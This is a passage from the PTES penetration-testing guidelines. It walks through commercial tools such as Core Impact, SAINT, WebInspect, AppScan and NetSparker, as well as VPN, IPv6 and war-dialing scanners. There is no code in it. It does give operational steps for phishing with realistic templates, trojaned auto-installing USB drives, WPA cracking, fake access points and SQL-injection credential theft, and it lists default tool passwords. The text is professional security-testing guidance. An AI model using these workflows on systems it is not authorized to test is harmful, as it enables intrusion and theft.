<p>Monitor the Executed Modules pane to see the progress of the client side attack. As agents are deployed, they will be added to the network tab. See the network RPT section of the PTES for details on completing the local information gathering, privilege escalation and clean up tasks. </p>
<p>Once the client side attack is complete, detailed reporting of the client side phishing/exploitation engagement can be generated.    </p>
<p>It is also possible to create a trojaned USB drive that will automatically install the Core agent.</p>
<p>'''
[[:File:coreCSusb.jpg|Screenshot Here]]
'''</p>
<h6 id="core-web">Core Web</h6>
<p>Core can exploit SQL injection, Remote File Inclusion and Reflected Cross Site Scripting flaws on vulnerable web applications.
'''
[[:File:coreWEBrpt.jpg|Screenshot Here]]
'''</p>
<p>1) Information Gathering.
As always, the first step information gathering. Core organizes web attacks into scenarios. You can create multiple scenarios and test the same application with varying settings, segment a web application, or to separate multiple applications. 
a) Select the target, either by providing a url or telling Core to choose web servers discovered during the network RPT
b) Choose a method for exploring the site, automatic or interactive. 
    With automatic crawling, select the browser agent, max pages and depth, whether it should follow links to other/or to include other domains, whether it should run test to determine the server/application framework, whether to evaluate javascript, check robots.txt for links, and how it should handle forms. For greater customization, you can also select a link parsing module and set session parameters.</p>
<h6 id="corewebcrawl">coreWEBcrawl</h6>
<p>With interactive, you set your ”browser” to use Core as a proxy and then navigate through the web application.
Further customized discovery modules like checking for backup and hidden pages are available on the modules tab.
'''
[[:File:corerptmodules.jpg|Screenshot Here]]
''' </p>
<p>2) Web Attack and penetration.
The attack can be directed to a scenario or individual pages. Each type of exploit has its own configuration wizard.
SQL Injection tests can be performed on request parameters and/or request cookies. There are three different levels of injection attacks
FAST: quickly runs the most common tests, NORMAL: runs the tests that are in the FAST plus some additional tests FULL: runs all tests (for details on what the difference tests check for, select the modules tab, navigate to the Exploits | SQL Injection section and view the contents of the SQL Injection Analyzer paying attention to the fuzz_strings). Adding information about known custom error pages and any session arguments will enhance testing.
For XSS attacks, configure the browser XSS should be tested for, whether or not to evaluate POST parameters and whether to look for Persistent XSS vulnerabilities.
For PHP remote file injection vulnerabilities, the configuration is either yes try to exploit or no, don’t.
Monitor the module progress in the Executed Modules pane. If the WebApps Attack and Penetration is successful, then Core Agents (see note on agents in Core network RPT) will appear under vulnerable pages in the Entity View.</p>
<p>3) Web Apps Browser attack.
Can leverage XSS exploits to assist with Social Engineering awareness tests. The wizard will guide the penetration tester though the process of leveraging the XSS vulnerability to your list of recipients from the client side information gathering phase. </p>
<p>4) Web App Local Information Gathering.
Will check for sensitive information, get database logins and get the database schema for pages where SQL was successfully exploited. Command and SQL shells may also be possible. 
'''
[[:File:coreWEBagendeployed.jpg|Screenshot Here]]
'''
The RFI agent(PHP) can be used to gather information, for shell access, or to install the full Core Agent. </p>
<p>5) Report Generation.
Select from a variety of reports like executive, vulnerability and activity reports.</p>
<h6 id="core-onestep-web-rpts">Core Onestep Web RPTs</h6>
<p>Core also has two one-step rapid penetration tests
1) WebApps Vulnerability Test
Type in the web application and Core will attempt to locate pages that contain vulnerabilities to SQL Injection, PHP Remote File Inclusion, or Cross-site Scripting attacks. This test can also be scheduled. 
2) WebApps Vulnerability Scanner Validator
Core will try to confirm vulnerabilities from IBM Rational AppScan, HP WebInspect, or NTOspider scans.</p>
<h6 id="core-wifi">Core WiFi</h6>
<p>Core Impact contains a number of modules for penetration testing an 802.11 wireless network and/or the security of wireless clients. 
In order to use the wireless modules you must use an AirPcap adapter available from <a href="http://www.cacetech.com">www.cacetech.com</a>.
<corewireless.jpg>
1) Information Gathering.
Select the channels to scan to discover access points or capture wireless packets.</p>
<p>2) Wireless Denial of Service
The station deauth module can be used to demonstrate wireless network disruption. It is also used to gather information for encryption key cracking.</p>
<p>3) Crack Encryption Keys.
Attempt to discover and crack WEP and WPA/WPA2 PSK encryption keys. For WPA/WPA2, relevant passwords files from recognisance phase should be used.</p>
<p>4) Man in the Middle client attacks.
Allows penetration tester to sniff wireless traffic, intercept or manipulate requests to gain access to sensitive data or an end user system. 
Leverage existing wireless network from steps one and two, or setup fake access points with the Karma Attack.</p>
<p>5) Reporting.
Reports about all the discovered WiFi networks , summary information about attacks while using a Fake Access Point and results of Man In The Middle (MiTM) attacks can be generated.</p>
<h5 id="saint">SAINT</h5>
<p>SAINT Professional is a commercial suite combining two distinct tools rolled into one easy to use management interface; SAINTscanner and SAINTexploit providing a fully integrated vulnerability assessment and penetration testing toolkit.  </p>
<p>SAINTscanner is designed to identify vulnerabilities on network devices, OS and within applications.  It can be used for compliance and audit testing based on pre-defined and custom policies.  In addition as a data leakage prevention tool it can enumerate any data that should not be stored on the network. 
SAINTexploit is designed to exploit those vulnerabilities identified by SAINTscanner, with the ability to carry out bespoke social engineering and phishing attacks also.  One a host or device has been exploited it can be utilised to tunnel through to other vulnerable hosts.
SAINT can either be built from source or be run from a pre-configured virtual machine supplied by the vendor.  If the latter is used (recommended) simply double clicking the icon will launch the suite.  By default the password is “SAINT!!!”  The default web browser opens after SAINT auto updates to the following URL: http://<IP ADDRESS>:52996/
Screenshot Here SAINT_startup.png refers (included).</p>
<h6 id="saintscanner">SAINTscanner</h6>
<p>Once logged in you immediately enter the SAINTscanner page with the Penetration Testing (SAINTXploit) tab easily available and visible.  It is possible to login remotely to SAINT, by default this is over port 1414 and has those hosts allowed to connect have to be setup via Options, startup options, Category remote mode, subcategory host options:
Screenshot Here  SAINT_Remote_host.png refers (included).
Configuration of scanning options should now be performed which is accessed by Options, scanning options, Category scanning policy.  Each sub category needs to be addressed to ensure that the correct default scanning parameters are set i.e. using nmap rather than the in-built SAINT port scanner and which ports to probe, that dangerous checks are disabled (if required) and that the required items for compliance and audit are enabled for reporting i.e. anti-virus, age of definition check etc.
Screenshot Here SAINT_scanning_options.png refers (included).
Note: - The target restrictions sub-category should be amended if any hosts are not to be probed.
The most import scanning option is Category Scanning policy, sub-category probe options, option, what scanning policy should be used, the scan required is selected or a custom policy built-up to suit the actual task
Screenshot here SAINT_policy_setup.png  refers (included).
Having configured all the options required the actual process of carrying out a scan can be addressed.
Step 1 Insert IP Range/ Address or Upload Target List  <br />
Step 2 Type in credentials
Screenshot here SAINT_scansetup1.png  refers (included).
Step 3 Select Scan Policy Type
Step 4 Determine Firewall settings for Target
Step 5 Select Scan Now
Screenshot here SAINT_scansetup2.png  refers (included).</p>
<h6 id="saintexploit">SAINTexploit</h6>
<p>Different levels of penetration tests can be carried out: </p>
<p>Discovery - Identify hosts.
Information Gathering - Identify hosts, probe and port scan.
Single Penetration - Both above then exploits stopping at first successful exploit.
Root Penetration - Exploit then Privilege escalation to admin/ root.
Full Penetration - Exploits as many vulnerabilities as possible.
Web Application - Attacks discovered web applications.</p>
<p>Conducting a test is fairly straight forward, once any prior configuration has been carried out, callback ports, timeouts etc. Just select the Pen Test icon then go through the following 4 steps.  Once complete select run pen test now.</p>
<p>Step 1 Insert IP Range/ Address or Upload Target List  <br />
Step 2 Type in credentials                                          </p>
<p>Screenshot here SAINT_pen1.png  refers (included).</p>
<p>Step 3 Select Penetration Test Type
Step 4 Determine Firewall settings for Target</p>
<p>SAINT_pen2.png Screenshot here SAINT_pen2.png  refers (included).</p>
<p>Once a host has been successfully exploited, navigating to the connections tab provides the ability to directly interact with the session.  SAINTexploit provides four useful tools in this tab to allow interactive access to the session and a disconnect button to close any outstanding connection:</p>
<p>Command Prompt.
File and Upload Manager.
Screenshot Taker
Tunnel.</p>
<p>Screenshot here SAINT_connections.png refers (included)
The File Manager gives the ability to perform numerous actions. This is opened via the connections tab, providing the ability to upload/ download/ rename files.
Screenshot here SAINT_filemgr.png refers (included)
A Command Prompt can be utilised on an exploited host, the tool is opened via the connections tab, all DOS/Bash type commands that are applicable to the target OS can be ran.    <br />
Screenshot here SAINT_cmd.png refers (included)
The Screenshot Tool can be used against an exploited host to grab a screenshot for the report.
Screenshot here SAINT_screen.png refers (included)
Varied other tools that can be utilised against the host, i.e. grabbing password hashes and many others can be accessed and executed via the exploits icon, tools option.</p>
<p>Custom Client Side attacks
These can be performed by using the exploits icon, selecting exploits, expanding out the client list and clicking on the appropriate exploit that you wish to utilise against the client (run now)
Screenshot here SAINT_client1.png refers (included)
Select, port the client is to connect to, the shell port and the target type.
Annotate any specific mail from and to parameters
Screenshot here SAINT_client2.png refers (included)
Type in the subject, either select a predefined template and alter the message to suit
Screenshot here SAINT_client3.png refers (included)
A sample pre-defined template is available which looks very realistic
Screenshot here SAINT_client4.png refers (included)
Selecting run now will start the exploit server against the specified target host
Screenshot here SAINT_client5.png refers (included)
If a client click the link in the email they have just been sent, and they are exploitable, the host will appear in the connections tab and can then be interacted with as above.</p>
<h6 id="saintwriter">SAINTwriter</h6>
<p>SAINTwriter is a component of SAINT that allows you to generate a variety of customised reports. SAINTwriter features eight pre-configured reports, eight report formats (HTML, Frameless HTML, Simple HTML, PDF, XML, text, tab-separated text, and comma-separated text), and over 100 configuration options for custom reports. </p>
<p>To generate a report</p>
<p>Step 1 From the SAINT GUI, go to Data, and from there go to SAINTwriter. 
Step 2 Read the descriptions of the pre-configured reports and select the one which best suits your needs. 
Screenshot here SAINT_writer.png  refers (included). 
A sample report is available here and here SAINT_report1.pdf and SAINT_report2.pdf refer (included)</p>
<h4 id="web-application-scanners">Web Application Scanners</h4>
<h5 id="general-web-application-scanners">General Web Application Scanners</h5>
<h6 id="webinspect-windows">WebInspect (Windows)</h6>
<p>HP's WebInspect application security assessment tool helps identify known and unknown vulnerabilities within the Web application layer.  WebInspect can also help check that a Web server is configured properly, and attempts common web attacks such as parameter injection, cross-site scripting, directory traversal, and more</p>
<p>When you first start WebInspect, the application displays the Start Page.  For this page we can perform the five major functions within the WebInpsect GUI.  The options are to start a Web Site Assessment, start a Web Service Assessment, start an Enterprise Assessment, generate a Report, and start Smart Update.  From the Start Page, you can also access recently opened scans, view the scans that are scheduled for today and finally, view the WebInspect Messages.</p>
<p>'''
[[:File:Penetration_Testing_Execution_99.png|Screenshot Here]]
'''</p>
<p>The first scan that is performed with WebInspect is the Web Site Assessment Scan.  WebInspect makes use of the New Web Site Assessment Wizard to setup the assessment scans.</p>
<p>'''
[[:File:Penetration_Testing_Execution_100.png|Screenshot Here]]
'''</p>
<p>When you start the New Scan wizard, the Scan Wizard window appears.  The options displayed within the wizard windows are extracted from the WebInspect default settings.  The important thing to note is that any changes you make will be used for this scan only.</p>
<p>In the Scan Name box, enter a name or a brief description of the scan.  Next you need to select one an assessment mode.  The options available are Crawl Only, Crawl and Audit, Audit Only, and Manual.  The "Crawl Only" option completely maps a site's tree structure.  It is possible after a crawl has been completed, to click "Audit" to assess an application's vulnerabilities.  "Crawl and Audit" maps the site's hierarchical data structure, and audits each page as it is discovered.  This should be used when assessing extremely large sites.  "Audit Only" determines vulnerabilities, but does not crawl the web site.  The site is not assessed when this option is chosen.  Finally, "Manual" mode allows you to navigate manually to sections of the application.  It does not crawl the entire site, but records information only about those file_suport that you encounter while scanning a Site manually navigating the site.  Use this option if there are credentialed scans being performed.  Also, ensure that you embed the credentials in the profile settings.</p>
<p>'''
[[:File:Penetration_Testing_Execution_101.png|Screenshot Here]]
'''</p>
<p>It is recommended to crawl the client site first.  This allows the opportunity to identify any forms that need to be filtered during the audit as well as identify directories/file names (in some cases, even the profiler) that need to be ignored for a scan to complete.</p>
<p>Once you have selected the assessment mode, you will need to select the assessment type.  There are four options available, Standard Assessment, List-Driven Assessment, Manual Assessment, and Workflow-Driven Assessment.  The Standard Assessment type consists of automated analysis, starting from the target URL.  This is the normal way to start a scan.  Manual Assessment allows you to navigate manually to</p>
<p>whatever sections of your application you choose to visit, using Internet Explorer.  List-Driven Assessment performs an assessment using a list of URLs to be scanned.  Each URL must be fully qualified and must include the protocol (for example, http:// or https://).  Workflow-Driven Assessment: WebInspect audits only those URLs included in the macro that you previously recorded and does not follow any hyperlinks encountered during the audit.</p>
<p>As discussed earlier, Standard Assessment will normally be used for the initial scans.  If this is the choice you've selected you will need to type or select the complete URL or IP address of the client's site to be examined.  When you enter a URL, it must be precise.  For example, if you entering client.com will not result in a scan of <a href="http://www.client.com">www.client.com</a> or any other variations.  To scan from a specific point append a starting point for the scan, such as <a href="http://www.client.com/clientapplication/">http://www.client.com/clientapplication/</a>.  By default, scans performed by IP address will not follow links that use fully qualified URLs.</p>
<p>'''
[[:File:Penetration_Testing_Execution_102.png|Screenshot Here]]
'''</p>
<p>Select "Restrict to folder" to limit the scope of the assessment to the area selected.  There are three options available from the drop-down list.</p>
<p>'''
[[:File:Penetration_Testing_Execution_103.png|Screenshot Here]]
'''</p>
<p>The choices are Directory only, Directory and subdirectories, and Directory and parent directories.  Choosing the "Directory only" option will force a crawl and/or audit only for the URL specified.  The "Directory and subdirectories" options will crawl and/or audit at the URL specified as well as subordinate directories.  It will not access any directory than the URL specified.  The "Directory and parent directories" option will crawl and/or audit the URL you specified, but will not access any subordinate directories.</p>
<p>Once you have selected to appropriate options, click Next to continue.</p>
<p>If the target site needs to accessed through a proxy server, select Network Proxy and then choose an option from the Proxy Profile list.  The default is to Use Internet Explorer.  The other options available are Autodetect, Use PAC File, Use Explicit Proxy Settings, and Use Mozilla Firefox.  Autodetect uses the Web Proxy Autodiscovery Protocol (WPAD) to locate a proxy autoconfig file and use this to configure the browser's Web proxy settings. Use PAC File loads proxy settings from a Proxy Automatic Configuration (PAC) file.  Use Explicit Proxy Settings allows you to specify proxy server settings. Use Mozilla Firefox imports the proxy server information from Firefox.</p>
<p>'''
[[:File:Penetration_Testing_Execution_104.png|Screenshot Here]]
'''</p>
<p>Selecting to use browser proxy settings does not guarantee that you will be able to access the Internet through a particular proxy server.  If the Internet Explorer settings are configured to use a proxy that is not running, then you will not be able to access the site to begin the assessment.  For this reason, it is always recommended to check the prosy settings of the application you have selected.</p>
<p>Select Network Authentication if server authentication is required.  Then choose the specific authentication method and enter your network credentials.  Click Next to continue.</p>
<p>The Coverage and Thoroughness options are not usually modified, unless you are targeting an Oracle site.</p>
<p>[[:File:Penetration_Testing_Execution_105.png|Screenshot Here]]</p>
<p>To optimize settings for an Oracle site, select Framework and then choose the site type from the Optimize scan for list.  Use the Crawl slider to specify the crawler settings.</p>
<p>If enabled, the slider allows you to select one of four crawl positions.  The options are Thorough, Default, Normal, and Quick.  The specific settings are as follows:</p>
<p>Thorough uses the following settings:</p>
<ul>
<li>Redundant Page Detection: OFF </li>
<li>Maximum Single URL Hits: 20</li>
<li>Maximum Web Form Submissions: 7</li>
<li>Create Script Event Sessions: ON</li>
<li>Maximum Script Events Per Page: 2000</li>
<li>Number of Dynamic Forms Allowed Per Session: Unlimited</li>
<li>Include Parameters In Hit Count: True</li>
</ul>
<p>Default uses the following settings:</p>
<ul>
<li>Redundant Page Detection: OFF</li>
<li>Maximum Single URL Hits: 5</li>
<li>Maximum Web Form Submissions: 3</li>
<li>Create Script Event Sessions: ON</li>
<li>Maximum Script Events Per Page: 1000</li>
<li>Number of Dynamic Forms Allowed Per Session: Unlimited</li>
<li>Include Parameters In Hit Count: True</li>
</ul>
<p>Normal uses the following settings:</p>
<ul>
<li>Redundant Page Detection: OFF</li>
<li>Maximum Single URL Hits: 5</li>
<li>Maximum Web Form Submissions: 2</li>
<li>Create Script Event Sessions: ON</li>
<li>Maximum Script Events Per Page: 300</li>
<li>Number of Dynamic Forms Allowed Per Session: 1</li>
<li>Include Parameters In Hit Count: False</li>
</ul>
<p>Quick uses the following settings:</p>
<ul>
<li>Redundant Page Detection: ON</li>
<li>Maximum Single URL Hits: 3</li>
<li>Maximum Web Form Submissions: 1</li>
<li>Create Script Event Sessions: OFF</li>
<li>Maximum Script Events Per Page: 100</li>
<li>Number of Dynamic Forms Allowed Per Session: 0</li>
<li>Include Parameters In Hit Count: False</li>
</ul>
<p>Select the appropriate crawl position and click Next to continue.</p>
<p>'''
[[:File:Penetration_Testing_Execution_106.png|Screenshot Here]]
'''</p>
<p>Ensure that the select Run Profiler Automatically box is checked.  Click Next to continue.</p>
<p>'''
[[:File:Penetration_Testing_Execution_107.png|Screenshot Here]]
'''</p>
<p>At this point the scan has been properly configured.  There is an option to save the scan settings for later use.  Click Scan to exit the wizard and begin the scan.</p>
<p>As soon as you start a Web Site Assessment, WebInspect displays in the Navigation pane an icon depicting each session.  It also reports possible vulnerabilities on the Vulnerabilities tab and Information tab in the Summary pane.  If you click a URL listed in the Summary pane, the program highlights the related session in the Navigation pane and displays its associated information in the Information pane.  The relative severity of a vulnerability listed in the Navigation pane is identified by its associated icon.</p>
<p>[[:File:Penetration_Testing_Execution_108.png|Screenshot Here]]</p>
<p><br>When conducting or viewing a scan, the Navigation pane is on the left side of the WebInspect'' ''window.  It includes the Site, Sequence, Search, and Step Mode buttons, which determines view presented.</p>
<p>When conducting or viewing a scan, the Information pane contains three collapsible information panels and an information display area.  Select the type of information to display by clicking on an item in one of three information panels in the left column.</p>
<p>The Summary pane has five tabs: Vulnerabilities, Information, Best Practices, Scan Log, and Server Information.  The Vulnerabilities Tab lists all vulnerabilities discovered during an audit.  The Information Tab lists information discovered during an assessment or crawl.  These are not considered vulnerabilities, but simply identify interesting points in the site or certain applications or Web servers.  The Best Practices Tab lists issues detected by WebInspect that relate to commonly accepted best practices for Web development.  Items listed here are not vulnerabilities, but are indicators of overall site quality and site development security practices (or lack thereof).</p>
<p>The Scan Log Tab is used to view information about the assessment.  For instance, the time at which certain auditing was conducted against the target.  Finally, the Server Information Tab lists items of interest pertaining to the server.</p>
<p>'''
[[:File:Penetration_Testing_Execution_109.png|Screenshot Here]]
'''</p>
<p>The final step is to export the results further analysis.  To export the results of the analysis to an XML file, click File, then Export.  This presents the option to export the Scan or Scan Details.</p>
<p>'''
[[:File:Penetration_Testing_Execution_110.png|Screenshot Here]]
'''</p>
<p>From the Export Scan Details window we need to choose the Full from the Details option.  This will ensure that we obtain the most comprehensive report possible.  Since this is only available in XML format, the only option we have left to choose is to scrub data.  If you want to ensure that SSN, and Credit Card data is scrubbed then select these options.  If you choose to scrub IP address information then the exported data will be useless for our purposes.  Click Export to continue.  Choose the file location to save the exported data.</p>
<p>'''Web Service Assessment Scan'''</p>
<p>The first scan that is performed with WebInspect is the Web Site Assessment Scan.  WebInspect makes use of the New Web Site Assessment Wizard to setup the assessment scans.</p>
<p>'''
[[:File:Penetration_Testing_Execution_111.png|Screenshot Here]]
'''</p>
<p>When you start the New wizard, the Web Service Scan Wizard window appears.  The options displayed within the wizard windows are extracted from the WebInspect default settings.  The important thing to note is that any changes you make will be used for this scan only.</p>
<p>In the Scan Name box, enter a name or a brief description of the scan.  Next you need to select one an assessment mode.  The options available are Crawl Only, and Crawl and Audit.  The "Crawl Only" option completely maps a site's tree structure.  It is possible after a crawl has been completed, to click "Audit" to assess an application's vulnerabilities.  "Crawl and Audit" maps the site's hierarchical data structure, and audits each page as it is discovered.</p>
<p>'''
[[:File:Penetration_Testing_Execution_112.png|Screenshot Here]]
'''</p>
<p>Once you have selected the assessment mode, you will need to select the location of the WSDL file.  WSDL is an XML format for describing network services as a set of endpoints operating on messages containing either document-oriented or procedure-oriented information.  Once you have selected to appropriate options, click Next to continue.</p>
<p>'''
[[:File:Penetration_Testing_Execution_113.png|Screenshot Here]]
'''</p>
<p>At this point the scan has been properly configured.  There is an option to save the scan settings for later use.  Click Scan to exit the wizard and begin the scan.</p>
<p>As soon as you start a Web Service Assessment, WebInspect displays in the Navigation pane an icon depicting each session.  It also reports possible vulnerabilities on the Vulnerabilities tab and Information tab in the Summary pane.  If you click a URL listed in the Summary pane, the program highlights the related session in the Navigation pane and displays its associated information in the Information pane.  The relative severity of a vulnerability listed in the Navigation pane is identified by its associated icon.</p>
<p>'''
[[:File:Penetration_Testing_Execution_114.png|Screenshot Here]]
'''</p>
<p>When conducting or viewing a scan, the Navigation pane is on the left side of the WebInspect'' ''window.  It includes the Site, Sequence, Search, and Step Mode buttons, which determines view presented.</p>
<p>When conducting or viewing a scan, the Information pane contains three collapsible information panels and an information display area.  Select the type of information to display by clicking on an item in one of three information panels in the left column.</p>
<p>The Summary pane has five tabs: Vulnerabilities, Information, Best Practices, Scan Log, and Server Information.  The Vulnerabilities Tab lists all vulnerabilities discovered during an audit.  The Information Tab lists information discovered during an assessment or crawl.  These are not considered vulnerabilities, but simply identify interesting points in the site or certain applications or Web servers.  The Best Practices Tab lists issues detected by WebInspect that relate to commonly accepted best practices for Web development.  Items listed here are not vulnerabilities, but are indicators of overall site quality and site development security practices (or lack thereof).</p>
<p>The Scan Log Tab is used to view information about the assessment.  For instance, the time at which certain auditing was conducted against the target.  Finally, the Server Information Tab lists items of interest pertaining to the server.</p>
<p>'''
[[:File:Penetration_Testing_Execution_115.png|Screenshot Here]]
'''</p>
<p>The final step is to export the results for further analysis.  To export the results of the analysis to an XML file, click File, then Export.  This presents the option to export the Scan or Scan Details.</p>
<p>'''
[[:File:Penetration_Testing_Execution_116.png|Screenshot Here]]
'''</p>
<p>From the Export Scan Details window we need to choose the Full from the Details option.  This will ensure that we obtain the most comprehensive report possible.  Since this is only available in XML format, the only option we have left to choose is to scrub data.  If you want to ensure that SSN, and Credit Card data is scrubbed then select these options.  If you choose to scrub IP address information then the exported data will be useless for our purposes.  Click Export to continue.  Choose the file location to save the exported data.</p>
<h6 id="ibm-appscan">IBM AppScan</h6>
<p>IBM Rational AppScan automates application security testing by scanning applications, identifying vulnerabilities and generating reports with recommendations to ease remediation. 
This tutorial will apply to the AppScan Standard Edition which is a desktop solution to automate Web application security testing. It is intended to be use by small security teams with several security testers.</p>
<p><AppScan01 Screen Shot Here></p>
<p>To ensure APPScan has the latest updates you should click update on the toolbar menu. 
This will check the IBM servers for updates. Internet access is required.</p>
<p><AppScan02 Screen Shot Here></p>
<p>The simplest way to configure a scan is to use the Configuration Wizard. 
You can access the Configuration Wizard by clicking “New” on the File menu.
You will be presented with the “New Scan” dialog box. Enable or disable the “Configuration Wizard” by checking the box. </p>
<p><AppScan03 Screen Shot Here></p>
<p>You can then choose what type of scan you wish to perform. The default is a Web Application Scan.</p>
<p><AppScan04 Screen Shot Here></p>
<p>You then have to enter the starting URL for the web application. Other options on that screen include choosing Case-Sensitivity path for Unix\Linux systems, adding additional servers and domains and enabling proxy and platform authentication option. Uncheck the case-sensitivity path option if you know all the systems are windows as it can help reduce the scan time.</p>
<p><AppScan05 Screen Shot Here></p>
<p>If the web application requires authentication then there are several options to choose from. Recorded allows you to record the login procedure so that AppScan can perform the login automatically. Prompt will prompt with the login screen during the scan when a login is required. Automatic can be used in web applications that only require a username and password.
An important option is the “I want to configure In-Session detection options” if anything other they “None” is chosen. This option automatically detects if the web application is out of session. AppScan with automatically configure this feature but if it’s not correct scan results will be unreliable.  </p>
<p><AppScan06 Screen Shot Here></p>
<p><AppScan06a Screen Shot Here></p>
<p>Next you will be asked to choose a test policy. There are various built-in policies and each have various inclusions and exclusions. You can also create a custom policy.</p>
<p>By default AppScan tests the login and logout pages. This is enabled with the “Send tests on login and logout pages” option. Some applications have safeguards that could lockout the test account and prevent a scan from completing. You need monitor the testing logs to ensure login is not failing.
AppScan also deletes previous session tokens before testing login pages. You may need to disable this option if a valid session token is required on the login pages. This can disabled by unchecking the “Clear session identifiers before testing login pages” option</p>
<p><AppScan07 Screen Shot Here></p>
<p>You have now completed the scan configuration and will be prompted to start the scan. By default AppScan will start a full scan of the application. To ensure full coverage of the application a Manual Explore of the application is preferred. With this option AppScan with provide you with a browser window and you can access the application to explore every option and feature available. Once the full application has been explored you can close the browser and AppScan will add the discovered pages its list for testing. You can then start the full scan (Using ScanFull Scan on the menu bar) and AppScan will automatically scan the application. </p>
<p><AppScan08 Screen Shot Here></p>
<h6 id="web-directory-listingbruteforcing">Web Directory Listing/Bruteforcing</h6>
<p>DirBuster is a java application that is designed to brute force web directories and files names.  DirBuster attempts to find hidden or obfuscated directories, but as with any bruteforcing tool, it is only as good as the directory and file list utilized.  For that reason, DirBuster has 9 different lists.</p>
<p>[[:File:Penetration_Testing_Execution_117.png|Screenshot Here]]</p>
<h6 id="webserver-versionvulnerability-identification">Webserver Version/Vulnerability Identification</h6>
<p>The ability to identify the Webserver version is critical to identify vulnerabilities specific to a particular installation.  This information should have been gathered as part of an earlier phase.</p>
<h5 id="netsparker-windows">NetSparker (Windows)</h5>
<p>NetSparker is windows based Web Application Scanner. This scanner tests for all
common types of web application security flaws. This scanner allows the user to
enter NTLM, Forms based and certificate based credentials. NetSparker boasts its
ability to confirm the findings it presents to the user. NetSparker is an inexpensive
Web Application Scanner.</p>
<p>When launching NetSparker, the user is presented with the following screen, which
has tabs for the Scan Settings, Authentication and Advanced Settings.</p>
<p><netsparker1.png ScreenShot Here></p>
<p>NetSparker allows the user to enter credentials for Forms based Authentication in
the following dialogue.</p>
<p><netsparker2.png ScreenShot Here></p>
<p>Once credentials have been entered, NetSparker presents those to the web
application in a mini-browser view as seen below.</p>
<p><netsparker3.png ScreenShot Here></p>
<p>The below confirms that NetSparker is able to use the supplied credentials to login
to the application.</p>
<p><netsparker4.png ScreenShot Here></p>
<p>In an effort to make sure that NetSparker knows when it has logged itself out of the
web application, the user is able to specify the logged in and logged out conditions.</p>
<p><netsparker5.png ScreenShot Here></p>
<p>The final step of the process confirms the settings are configured correctly.</p>
<p><netsparker6.png ScreenShot Here></p>
<p>NetSparker offers five different methods to start the scan as seen below. These
include Start Scan, Crawl and Wait, Manual Crawl (Proxy Mode), Scan Imported
Links Only and Schedule Scan.</p>
<p><netsparker7.png ScreenShot Here></p>
<p>The scan starts with a crawl of the website and classifies the potential security
issues as seen below.</p>
<p><netsparker8.png ScreenShot Here></p>
<p>The next phase is attacking the website. This begins to show identified
vulnerabilities as shown in this screenshot.</p>
<p><netsparker9.png ScreenShot Here></p>
<p>Each finding can be shown in a Browser View as shown in this screenshot.</p>
<p><netsparker10.png ScreenShot Here></p>
<p>The vulnerability can also be displayed in an HTTP Request / Response format as
seen in this screenshot.</p>
<p><netsparker11.png ScreenShot Here></p>
<p>To check the status of the scan, click on View and select Dashboard.</p>
<p><netsparker12.png ScreenShot Here></p>
<p>Also included is the Vulnerability Chart</p>
<p><netsparker13.png ScreenShot Here>
Reporting options include PDF, HTML, CSV and XML formats.</p>
<h5 id="specialized-vulnerability-scanners">Specialized Vulnerability Scanners</h5>
<h6 id="virtual-private-networking-vpn">Virtual Private Networking (VPN)</h6>
<p>Virtual Private Networking (VPN) involves "tunneling" private data through the Internet.  The four most widely known VPN "standards" are Layer 2 Forwarding (L2F), IP Security (IPSec), Point-to-Point Tunneling Protocol (PPTP), and Layer 2 Tunneling Protocol (L2TP).  VPN servers generally will not be detected by a port scans as they don't listen on TCP ports, so a TCP port scan won't find them.  In addition, they won't normally send ICMP unreachable messages, so a UDP port scans more than likely won't find them.  This is why we need specialized scanners to find and identify them.</p>
<p>'''ike-scan'''</p>
<p>ike-scan is a command-line IPsec VPN scanning, fingerprinting and testing tool that uses the IKE protocol to discover, fingerprint and test IPsec VPN servers.  Ike-scan sends properly formatted IKE packet to each of the address you wish to scan and displays the IKE responses that are received.  While ike-scan has a dozens of options, we will only cover the basics here.</p>
<p>[[:File:Penetration_Testing_Execution_118.png|Screenshot Here]]</p>
<p>Using ike-scan to actually perform VPN discovery is relatively straight forward.  Simply give it a range and it will attempt to identify</p>
<p>[[:File:Penetration_Testing_Execution_119.png|Screenshot Here]]</p>
<h6 id="ipv6">IPv6</h6>
<p>The THC-IPV6 Attack Toolkit is a complete set of tools to scan for inherent protocol weaknesses of IPv6 deployments.  Implementation6 which performs various implementation checks on IPv6.</p>
<p>[[:File:Penetration_Testing_Execution_120.png|Screenshot Here]]</p>
<p>Exploit6 is another tool from the THC-IPV6 Attack Toolkit which can test for known ipv6 vulnerabilities.</p>
<p>[[:File:Penetration_Testing_Execution_121.png|Screenshot Here]]</p>
<p>[[:File:Penetration_Testing_Execution_122.png|Screenshot Here]]</p>
<h6 id="war-dialing">War Dialing</h6>
<p>War dialing is process of using a modem to automatically scan a list of telephone numbers, usually dialing every number in a local area code to search for computers, Bulletin board systems and fax machines.</p>
<p>'''WarVOX'''</p>
<p>WarVOX is a suite of tools for exploring, classifying, and auditing telephone systems. Unlike normal wardialing tools, WarVOX works with the actual audio from each call and does not use a modem directly. This model allows WarVOX to find and classify a wide range of interesting lines, including modems, faxes, voice mail boxes, PBXs, loops, dial tones, IVRs, and forwarders. WarVOX provides the unique ability to classify all telephone lines in a given range, not just those connected to modems, allowing for a comprehensive audit of a telephone system. VoIP</p>
<p>VoIP networks rely on the network infrastructure that just simply targeting phones and servers is like leaving half the scope untouched.  The intelligence gathering phase should have resulted in  identify all network devices, including routers and VPN gateways, web servers, TFTP servers, DNS servers, DHCP servers, RADIUS servers, and firewalls.  Note:  The default username is admin with a password of warvox.</p>
<p>[[:File:Penetration_Testing_Execution_122.png|Screenshot Here]]</p>
<p>'''iWar'''</p>
<p>iWar is a War dialer written for Linux, FreeBSD, OpenBSD, etc.</p>
<p>[[:File:Penetration_Testing_Execution_123.png|Screenshot Here]]</p>
<p>'''Plain Analog Wardialer (PAW) / Python Advanced Wardialing System (PAWS)'''</p>
<p>PAW / PAWS is a wardialing software in python.  It is designed to scan for ISDN (PAWS only) and newer analog modems.</p>
<p>[[:File:Penetration_Testing_Execution_124.png|Screenshot Here]]</p>
<p>'''SIPSCAN'''</p>
<p>SIPSCAN uses REGISTER, OPTIONS and INVITE request methods to scan for live SIP extensions and users.  SIPSCAN comes with a list of usernames (users.txt) to brute force.  This should be modified to include data collected during earlier phases to target the specific environment.</p>
<p>[[:File:Penetration_Testing_Execution_125.png|Screenshot Here]]</p>
<p>'''SIPSAK'''</p>
<p>SIPSAK is tool that can test for SIP enabled applications and devices using the OPTION request method only.</p>
<p>[[:File:Penetration_Testing_Execution_126.png|Screenshot Here]]</p>
<p>'''SVMAP'''</p>
